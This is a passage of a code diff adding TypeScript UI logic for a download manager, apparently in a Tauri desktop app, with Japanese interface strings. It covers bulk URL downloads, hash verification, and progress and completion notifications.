+  engBulkGo?.addEventListener("click", () => {
+    const text = engBulk?.value ?? "";
+    const urls = text
+      .split(/\r?\n/)
+      .map((s) => s.trim())
+      .filter((s) => /^https?:\/\//.test(s));
+    if (urls.length === 0) {
+      alert("有効な URL が見つかりません");
+      return;
+    }
+    if (!confirm(`${urls.length} 件をダウンロードしますか?`)) return;
+    void (async () => {
+      for (const u of urls) {
+        await triggerSave(u);
+      }
+    })();
+  });
+  verifyGo?.addEventListener("click", async () => {
+    const id = parseInt(verifySel?.value ?? "", 10);
+    const exp = verifyHash?.value?.trim();
+    if (!id || !exp) {
+      if (verifyResult)
+        verifyResult.textContent = "対象とハッシュ値を指定してください";
+      return;
+    }
+    if (verifyResult) verifyResult.textContent = "検証中...";
+    try {
+      const ok = await invoke<boolean>("downloads_verify_hash", {
+        id,
+        expected: exp,
+      });
+      if (verifyResult) {
+        verifyResult.textContent = ok
+          ? "✓ 一致しました"
+          : "✗ 不一致 (改ざん/破損の可能性)";
+        verifyResult.style.color = ok ? "#4ade80" : "#f87171";
+      }
+      await refresh();
+    } catch (e) {
+      if (verifyResult) verifyResult.textContent = `エラー: ${e}`;
+    }
+  });
+
+  // イベントリスナ
+  await listen<DownloadItem>("download-started", (ev) => {
+    const it = ev.payload;
+    const idx = items.findIndex((x) => x.id === it.id);
+    const isNew = idx < 0;
+    if (idx >= 0) items[idx] = it;
+    else items.push(it);
+    progressMap.delete(it.id);
+    if (panel.hidden) {
+      updateBadge();
+    } else {
+      render();
+    }
+    updateBadge();
+    if (isNew) {
+      pulseDownloadBtn();
+      const fname = it.filename || it.url || "(ファイル)";
+      showToast("⬇ ダウンロード開始", fname, "info", 3000);
+    }
+  });
+  await listen<{ id: number; bytes: number; total: number | null }>(
+    "download-progress",
+    (ev) => {
+      progressMap.set(ev.payload.id, {
+        bytes: ev.payload.bytes,
+        total: ev.payload.total,
+      });
+      // 速度推定 (EMA)
+      const now = performance.now();
+      const prev = speedTracker.get(ev.payload.id);
+      if (prev) {
+        const dt = (now - prev.lastTime) / 1000;
+        if (dt > 0.05) {
+          const inst = (ev.payload.bytes - prev.lastBytes) / dt;
+          const ema = prev.ema === 0 ? inst : prev.ema * 0.6 + inst * 0.4;
+          speedTracker.set(ev.payload.id, {
+            lastBytes: ev.payload.bytes,
+            lastTime: now,
+            ema,
+          });
+        }
+      } else {
+        speedTracker.set(ev.payload.id, {
+          lastBytes: ev.payload.bytes,
+          lastTime: now,
+          ema: 0,
+        });
+      }
+      if (!panel.hidden) render();
+    },
+  );
+  await listen<DownloadItem>("download-finished", (ev) => {
+    const it = ev.payload;
+    const idx = items.findIndex((x) => x.id === it.id);
+    if (idx >= 0) items[idx] = it;
+    else items.push(it);
+    progressMap.delete(it.id);
+    if (!panel.hidden) render();
+    updateBadge();
+    const fname = it.filename || it.url || "(ファイル)";
+    const status = (it.status || "").toLowerCase();
+    if (
+      status === "failed" ||
+      status === "cancelled" ||
+      status === "canceled"
+    ) {
+      showToast(
+        status === "failed" ? "✗ ダウンロード失敗" : "⊘ キャンセルされました",
+        fname,
+        "failed",
+        5000,
+      );
+    } else {
+      showToast("✓ ダウンロード完了", fname, "finished", 4000);
+    }
+  });
+
+  await refresh();
 }
